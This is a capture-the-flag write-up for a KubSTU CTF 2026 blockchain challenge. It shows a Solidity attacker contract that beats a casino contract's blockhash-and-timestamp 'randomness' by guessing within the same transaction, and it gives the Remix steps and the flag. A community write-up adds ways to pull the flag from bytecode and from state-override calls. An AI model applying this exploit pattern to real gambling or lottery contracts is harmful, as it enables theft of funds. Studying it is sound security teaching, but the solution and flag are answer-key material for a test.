# WEB-3 Casino

> **Category:** Blockchain · **Event:** KubSTU CTF 2026 Autumn

## 📌 Task

### Given

Network: Ethereum Sepolia

Challenge contract:

```text
0xa8d58d2C110e84C5De16ce9530557a8f38137bCb
```

Flag format:

```text
KubSTU{...}
```

**Files:** [task.txt](../../../assets/Web/Web-3%20%D0%9A%D0%B0%D0%B7%D0%B8%D0%BD%D0%BE/task.txt)

## 🏁 Solution

### Idea

The contract asks you to guess a number:

```solidity
guess(uint8 answer)
```

If `answer == random()`, the address is marked as solved and can call `getFlag()`.

The problem is that `random()` is computed from public block data:

```solidity
blockhash(block.number - 1)
block.timestamp
```

This is not real randomness. Another contract can, in a single transaction, call `random()`, obtain the correct answer and immediately pass it into `guess()`.

### Exploit

We create a file `BadRandomnessExploit.sol` in Remix:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

interface IBadRandomnessChallenge {
    function guess(uint8 answer) external;
    function random() external view returns (uint8);
    function getFlag() external view returns (string memory);
}

contract BadRandomnessExploit {
    function solve(address challenge) external {
        uint8 answer = IBadRandomnessChallenge(challenge).random();
        IBadRandomnessChallenge(challenge).guess(answer);
    }

    function getFlag(address challenge) external view returns (string memory) {
        return IBadRandomnessChallenge(challenge).getFlag();
    }
}
```

### Solving via Remix

1. Open `https://remix.ethereum.org/`.
2. Create the file `BadRandomnessExploit.sol`.
<img width="1378" height="560" alt="image" src="https://github.com/user-attachments/assets/56c39d40-d5d7-49f3-a45c-eee582394ced" />
3. Compile the contract.
<img width="1243" height="480" alt="image" src="https://github.com/user-attachments/assets/d735c22d-89c3-416e-914f-d9aa5e65c40c" />
5. In the `Deploy & Run Transactions` tab, select `Injected Provider - MetaMask`

6. Install the MetaMask extension, select the `Sepolia` network and get a few coins from some faucet (example faucet - https://sepolia-faucet.pk910.de/ )

<img width="730" height="521" alt="image" src="https://github.com/user-attachments/assets/c33479ce-ecc1-41eb-a662-25e756cf8c41" />

7. Deploy `BadRandomnessExploit`.
<img width="2550" height="1320" alt="Безымянный" src="https://github.com/user-attachments/assets/cd6eea0b-63ee-421b-8dd0-6c09cbd673fe" />

8. Call:

```text
solve(0xa8d58d2C110e84C5De16ce9530557a8f38137bCb)
```

9. After a successful transaction, call:

```text
getFlag(0xa8d58d2C110e84C5De16ce9530557a8f38137bCb)
```
<img width="2550" height="857" alt="Безымянный" src="https://github.com/user-attachments/assets/7f8f2e8f-7f9f-4b08-a46b-215f9abd575f" />

### Flag

```text
KubSTU{bad_randomness_same_tx}
```

---

### Community writeup (team mpei_larpers)

> **Source:** https://ctftime.org/writeup/41126 (CTFtime, user writeup) · **Event:** KubSTU CTF 2026: Autumn

On Sepolia the contract 0xa8d58d2C110e84C5De16ce9530557a8f38137bCb is deployed — a "casino" where the flag is hidden behind a "guess the number" game. `guess(uint8 answer)` accepts the answer only if it equals

uint8(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)))

and then marks the player in `solved` and opens `getFlag()`. Both inputs of this "random" number (the previous block's hash and the timestamp) do not change within the whole block, so the number is entirely predictable. An attacker contract calls `random()` and immediately `guess(...)` with the same value in a single transaction: both calls see the same block, the check always passes. The scheme "read the value in one transaction, guess in the next" does not work — the block is already different. This is the whole point of the challenge; the one-transaction pattern here is not a trick but the intent.

The flag, however, did not even have to be "won" — it lies right in the contract's runtime code. I recovered it in three independent ways, all giving the same string:

1. `eth_getCode` — the flag literal is baked into the bytecode (PUSH32 at offset 0x1fd, length 0x1e, exactly what `getFlag()` returns). On a public blockchain there is no "private".
2. `eth_call getFlag()` with a state override that marks our address as solved: the live contract executes its own success branch and returns the flag. Without the override the same call reverts with `Solve first `.
3. A Foundry fork-test that replays the honest exploit (call `random()`, guess, `getFlag()`) against the real deployed code: `[PASS]`, the flag in the logs.

A private key, faucet and funded account were not needed anywhere. I also demonstrated the predictability live: for block 11883331 the value of `random()` = 62; `eth_call guess(62)` passes, while the control `guess(63)` reverts with `Wrong guess`. This is the same oracle that the attacker contract sees inside a single transaction.

Selectors to cross-check with the dispatcher: getFlag()=0xf9633930, guess(uint8)=0x4ba4c16b, random()=0x5ec01e4d, solved(address)=0x5e36bdc6.

Flag: `KubSTU{bad_randomness_same_tx}`

**Flag:** `KubSTU{bad_randomness_same_tx}`
